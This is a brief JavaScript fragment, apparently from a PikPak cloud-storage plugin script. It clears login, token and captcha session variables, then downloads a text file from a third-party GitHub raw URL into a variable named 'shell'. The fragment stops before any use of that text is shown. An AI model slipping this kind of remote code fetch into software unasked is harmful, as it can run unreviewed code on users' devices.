(function(){
    ...
    try{
        clearMyVar('pikpak_v2_login_pass');
        clearMyVar('pikpak_v2_verify_token');
        clearMyVar('pikpak_v2_verify_url');
        clearMyVar('pikpak_v2_verify_user');
        clearMyVar('pikpak_v2_verified_captcha');
        clearMyVar('pikpak_v2_verify_handoff_done');
    }catch(e3){}
    var shell=String(request('https://raw.githubusercontent.com/huoguotiankong/asset-core-7f3/5c020787e09f3acc6be0d602c05b33af48fc8738/apps/cloud/pikpak/pikpak_remote_test_v5_b10105.txt')||'');
